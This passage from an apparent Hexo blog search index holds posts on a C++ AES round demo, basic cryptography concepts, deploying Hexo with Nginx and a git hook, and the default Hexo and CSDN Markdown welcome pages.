&#123;0xF3, 0x21, 0x41, 0x6A&#125;,\n&#125;;&#x2F;&#x2F;轮密钥矩阵\n \nint b[4][4];&#x2F;&#x2F;行移位后的矩阵\nint resMix[4][4];&#x2F;&#x2F;列混淆后的矩阵\nint res[4][4];&#x2F;&#x2F;轮密钥加后的矩阵\n \nint mul_mat(int x,int y) &#123;\n    if(x &#x3D;&#x3D; 0x01) &#123;\n        return y;\n    &#125;\n    else if(x &#x3D;&#x3D; 0x02) &#123;\n        if((y&amp;128) !&#x3D; 128) &#123; &#x2F;&#x2F;二进制首位为0\n            return y&lt;&lt;1;\n        &#125;\n        else &#123;\n            int temp &#x3D; ((y&lt;&lt;1)&amp;((1&lt;&lt;8)-1)); &#x2F;&#x2F;向左移一位，删掉最高位(保留8位)\n            return temp^(0x1b);\n        &#125;\n    &#125;\n    else if(x &#x3D;&#x3D; 0x03) &#123;\n        return mul_mat(0x02,y)^y;\n    &#125;\n&#125;\n \n \nint main() &#123;\n \n    cout&lt;&lt;&quot;字节代换后的矩阵为：&quot;&lt;&lt;endl;\n    for(int i&#x3D;0;i&lt;&#x3D;3;i++) &#123;\n        for(int j&#x3D;0;j&lt;&#x3D;3;j++) &#123;\n            cout&lt;&lt;hex&lt;&lt;a[i][j]&lt;&lt;&#39;\\t&#39;;\n        &#125;\n        cout&lt;&lt;endl;\n    &#125;\n \n    &#x2F;&#x2F;行移位\n    for(int i&#x3D;0;i&lt;&#x3D;3;i++)\n        for(int j&#x3D;0;j&lt;&#x3D;3;j++)\n            b[i][j] &#x3D; a[i][(i+j)%4];\n \n    cout&lt;&lt;&quot;行移位后的矩阵为：&quot;&lt;&lt;endl;\n    for(int i&#x3D;0;i&lt;&#x3D;3;i++) &#123;\n        for(int j&#x3D;0;j&lt;&#x3D;3;j++) &#123;\n            cout&lt;&lt;hex&lt;&lt;b[i][j]&lt;&lt;&#39;\\t&#39;;\n        &#125;\n        cout&lt;&lt;endl;\n    &#125;\n \n    &#x2F;&#x2F;列混淆\n    for(int i&#x3D;0;i&lt;&#x3D;3;i++) &#123;\n        for(int j&#x3D;0;j&lt;&#x3D;3;j++) &#123;\n            for(int k&#x3D;0;k&lt;&#x3D;3;k++) &#123;\n                resMix[i][j] ^&#x3D; mul_mat(mixCol[i][k],b[k][j]);\n            &#125;\n        &#125;\n    &#125;\n    cout&lt;&lt;&quot;列混淆后的矩阵为：&quot;&lt;&lt;endl;\n    for(int i&#x3D;0;i&lt;&#x3D;3;i++) &#123;\n        for(int j&#x3D;0;j&lt;&#x3D;3;j++) &#123;\n            cout&lt;&lt;hex&lt;&lt;resMix[i][j]&lt;&lt;&#39;\\t&#39;;\n        &#125;\n        cout&lt;&lt;endl;\n    &#125;\n \n    &#x2F;&#x2F;轮密钥加\n    for(int i&#x3D;0;i&lt;&#x3D;3;i++) &#123;\n        for(int j&#x3D;0;j&lt;&#x3D;3;j++) &#123;\n            res[j][i] &#x3D; resMix[j][i] ^ round_key[j][i];\n        &#125;\n    &#125;\n    cout&lt;&lt;&quot;轮密钥加后的矩阵为：&quot;&lt;&lt;endl;\n    for(int i&#x3D;0;i&lt;&#x3D;3;i++) &#123;\n        for(int j&#x3D;0;j&lt;&#x3D;3;j++) &#123;\n            cout&lt;&lt;hex&lt;&lt;res[i][j]&lt;&lt;&#39;\\t&#39;;\n        &#125;\n        cout&lt;&lt;endl;\n    &#125;\n&#125;\n\n\n","slug":"AES","date":"2020-11-04T13:03:45.000Z","categories_index":"密码学","tags_index":"密码学,AES","author_index":"Martin"},{"id":"d4fbd980dccf88ac6beac6e4a1d0235b","title":"密码学","content":"密码学概念总结\n专注于密钥的保护而不是加密算法\n\n1.对称密码    Alice和Bob使用相同的密钥和加密算法.\n    在A向B发送消息时,需要发送密钥.这会导致中间人C可以获得密钥破解密文.\n    因此需要好耗费人力和金钱安全传送密钥,\n    同时,一次会话使用一个密钥,导致密钥的保存冗杂.\n\n\n2.公钥密码    使用公钥和密钥的加密算法.\n    A在网络中展示自己的公钥,所有人可以获取并使用.\n    B想和A通信,则从网络中获得A的公钥,并对密文进行加密.\n    A的私钥可以解密A的公钥加密过的密文,所以只有A能解密.\n    防止了中间人攻击.\n\n3.混合密码    使用对称密码加密明文,使用公钥加密对称密码算法的密钥.\n    目的:由于使用公钥加密全部明文消耗过大,所以为了时间和资源\n    使用较快的对称密码加密明文,公钥仅仅需要加密key,减少工作量.\n\n","slug":"密码学","date":"2020-11-03T13:44:45.000Z","categories_index":"密码学","tags_index":"密码学,概论","author_index":"Martin"},{"id":"8efdfe4872c447599d42e0a8f10aa3e3","title":"Hexo搭建博客","content":"Hexo相关\nnpm hexo node安装\nhexo init blog(此处建议更换国内源,提高初始化速度,github乌龟速度)\nhexo g 生成静态页面,hexo s启动本地服务器, hexo d部署到github或者服务器\n\n服务器相关\nnginx,git安装如果无法建立连接，可以在本地生成ssh-keygen,将公钥保存到服务器再进行部署\nnginx配置a.nginx.confserver &#123;\n  # 侦听80端口\n  listen 80;\n  # 域名\n  server_name www.catnipball.xyz;\n  #默认请求\n  location / &#123;\n    # 网站根目录，此处为你的Hexo部署位置\n    root /home/hexo;\n    index index.html index.htm;\n  &#125;\n&#125;\nb.hooks:post-receive\n\n#!/bin/sh\ngit --work-tree=/home/hexo --git-dir=/home/git/blog.git checkout -f\nc.local hexo项目\n# Deployment\n# Docs: https://hexo.io/docs/deployment.html\ndeploy:\n  type: git                                       \n  repo: git@你的服务器ip:/home/git/blog.git\t\t\n  branch: master  \n问题\nNginx 403报错:将conf直接写在nginx.conf文件中;开放80端口\n图片无法加载(网页图片链接在github):取消本地hexo配置中github相关\n‘git’ 不是内部或外部命令，也不是可运行的程序或批处理文件。  Sol：添加git到环境变量&gt;set PATH=%PATH%;C:\\Program Files\\Git\\bin\n\n主题相关\n代码高亮显示：highlight:true;  然后在markdown文件里表明代码类型如C语言：csharp；\n\n","slug":"Hexo+Nginx+阿里云服务器搭建Blog相关","date":"2020-11-02T01:23:46.000Z","categories_index":"网站","tags_index":"Web,Hexo,阿里云","author_index":"Martin"},{"id":"8d4e245c2510a17ee8966741c7de26cc","title":"Hello, Hexo!","content":"Welcome to Hexo!This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2020-10-28T11:39:45.000Z","categories_index":"","tags_index":"","author_index":"Martin"},{"id":"fdb7b39345007537c53b3faf4c78f75e","title":"Markdown的使用","content":"@TOC\n欢迎使用Markdown编辑器你好！ 这是你第一次使用 Markdown编辑器 所展示的欢迎页。如果你想学习如何使用Markdown编辑器, 可以仔细阅读这篇文章，了解一下Markdown的基本语法知识。\n新的改变对Markdown编辑器进行了一些功能拓展与语法支持，除了标准的Markdown编辑器功能，我们增加了如下几点新功能，帮助你用它写博客：\n\n全新的界面设计 ，将会带来全新的写作体验；\n在创作中心设置你喜爱的代码高亮样式，Markdown 将代码片显示选择的高亮样式 进行展示；\n增加了 图片拖拽 功能，你可以将本地的图片直接拖拽到编辑区域直接展示；\n全新的 KaTeX数学公式 语法；\n增加了支持甘特图的mermaid语法^1 功能；\n增加了 多屏幕编辑 Markdown文章功能；\n增加了 焦点写作模式、预览模式、简洁写作模式、左右区域同步滚轮设置 等功能，功能按钮位于编辑区域与预览区域中间；\n增加了 检查列表 功能。\n\n功能快捷键撤销：Ctrl/Command + Z重做：Ctrl/Command + Y加粗：Ctrl/Command + B斜体：Ctrl/Command + I标题：Ctrl/Command + Shift + H无序列表：Ctrl/Command + Shift + U有序列表：Ctrl/Command + Shift + O检查列表：Ctrl/Command + Shift + C插入代码：Ctrl/Command + Shift + K插入链接：Ctrl/Command + Shift + L插入图片：Ctrl/Command + Shift + G查找：Ctrl/Command + F替换：Ctrl/Command + G\n合理的创建标题，有助于目录的生成直接输入1次#，并按下space后，将生成1级标题。输入2次#，并按下space后，将生成2级标题。以此类推，我们支持6级标题。有助于使用TOC语法后生成一个完美的目录。\n如何改变文本的样式强调文本 强调文本\n加粗文本 加粗文本\n==标记文本==\n删除文本\n\n引用文本\n\nH2O is是液体。\n2^10^ 运算结果是 1024.\n插入链接与图片链接: link.\n图片: \n带尺寸的图片: ![Alt](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw =30x30)\n居中的图片: \n居中并且带尺寸的图片: ![Alt](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw#pic_center =30x30)\n当然，我们为了让用户更加便捷，我们增加了图片拖拽功能。\n如何插入一段漂亮的代码片去博客设置页面，选择一款你喜欢的代码片高亮样式，下面展示同样高亮的 代码片.\n// An highlighted block\nvar foo = 'bar';\n\n生成一个适合你的列表\n项目\n项目\n项目\n\n\n\n\n\n\n项目1\n项目2\n项目3\n\n\n 计划任务\n 完成任务\n\n创建一个表格一个简单的表格是这么创建的：项目     | Value——– | —–电脑  | $1600手机  | $12导管  | $1\n设定内容居中、居左、居右使用:---------:居中使用:----------居左使用----------:居右| 第一列       | 第二列         | 第三列        ||:———–:| ————-:|:————-|| 第一列文本居中 | 第二列文本居右  | 第三列文本居左 |\nSmartyPantsSmartyPants将ASCII标点字符转换为“智能”印刷标点HTML实体。例如：|    TYPE   |ASCII                          |HTML|—————-|——————————-|—————————–||Single backticks|&#39;Isn&#39;t this fun?&#39;            |’Isn’t this fun?’            ||Quotes          |&quot;Isn&#39;t this fun?&quot;            |”Isn’t this fun?”            ||Dashes          |-- is en-dash, --- is em-dash|– is en-dash, — is em-dash|\n创建一个自定义列表MarkdownText-to-HTML conversion toolAuthors:  JohnLuke如何创建一个注脚一个具有注脚的文本。^2\n注释也是必不可少的Markdown将文本转换为 HTML。\n*[HTML]:   超文本标记语言\nKaTeX数学公式您可以使用渲染LaTeX数学表达式 KaTeX:\nGamma公式展示 $\\Gamma(n) = (n-1)!\\quad\\foralln\\in\\mathbb N$ 是通过欧拉积分\n$$\\Gamma(z) = \\int_0^\\infty t^{z-1}e^{-t}dt,.$$\n\n你可以找到更多关于的信息 LaTeX 数学表达式here.\n\n新的甘特图功能，丰富你的文章gantt\n        dateFormat  YYYY-MM-DD\n        title Adding GANTT diagram functionality to mermaid\n        section 现有任务\n        已完成               :done,    des1, 2014-01-06,2014-01-08\n        进行中               :active,  des2, 2014-01-09, 3d\n        计划一               :         des3, after des2, 5d\n        计划二               :         des4, after des3, 5d\n\n关于 甘特图 语法，参考 这儿,\n\nUML 图表可以使用UML图表进行渲染。 Mermaid. 例如下面产生的一个序列图：\nsequenceDiagram\n张三 ->> 李四: 你好！李四, 最近怎么样?\n李四-->>王五: 你最近怎么样，王五？\n李四--x 张三: 我很好，谢谢!\n李四-x 王五: 我很好，谢谢!\nNote right of 王五: 李四想了很长时间, 文字太长了&lt;br/>不适合放在一行.\n\n李四-->>张三: 打量着王五...\n张三->>王五: 很好... 王五, 你怎么样?\n\n这将产生一个流程图。:\ngraph LR\nA[长方形] -- 链接 --> B((圆))\nA --> C(圆角长方形)\nB --> D&#123;菱形&#125;\nC --> D\n\n\n关于 Mermaid 语法，参考 这儿,\n\nFLowchart流程图我们依旧会支持flowchart的流程图：\nflowchat\nst=>start: 开始\ne=>end: 结束\nop=>operation: 我的操作\ncond=>condition: 确认？\n\nst->op->cond\ncond(yes)->e\ncond(no)->op\n\n\n关于 Flowchart流程图 语法，参考 这儿.\n\n导出与导入导出如果你想尝试使用此编辑器, 你可以在此篇文章任意编辑。当你完成了一篇文章的写作, 在上方工具栏找到 文章导出 ，生成一个.md文件或者.html文件进行本地保存。\n导入如果你想加载一篇你写过的.md文件，在上方工具栏可以选择导入功能进行对应扩展名的文件导入，继续你的创作。\n","slug":"欢迎使用CSDN-markdown编辑器","date":"2020-10-26T10:38:45.000Z","categories_index":"关于Markdown的使用","tags_index":"Markdown","author_index":"Martin"}]